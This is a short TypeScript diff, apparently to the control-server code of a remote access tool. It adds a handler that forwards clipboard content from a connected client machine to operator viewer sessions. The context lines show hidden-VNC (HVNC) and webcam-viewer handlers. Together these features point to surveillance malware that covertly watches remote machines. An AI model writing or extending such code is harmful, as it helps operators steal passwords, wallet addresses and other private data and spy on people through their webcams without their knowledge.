@@ -504,6 +504,15 @@ export function handleHVNCLookupResult(clientId: string, payload: any) {
   }
 }
 
+export function handleClipboardContent(clientId: string, payload: any) {
+  for (const session of sessionManager.getConsoleSessionsByClient(clientId)) {
+    safeSendViewer(session.viewer, {
+      type: "clipboard_content",
+      content: String(payload.content ?? ""),
+    });
+  }
+}
+
 export function handleWebcamViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
   const payload = decodeViewerPayload(raw);
   if (!payload || typeof payload.type !== "string") return;
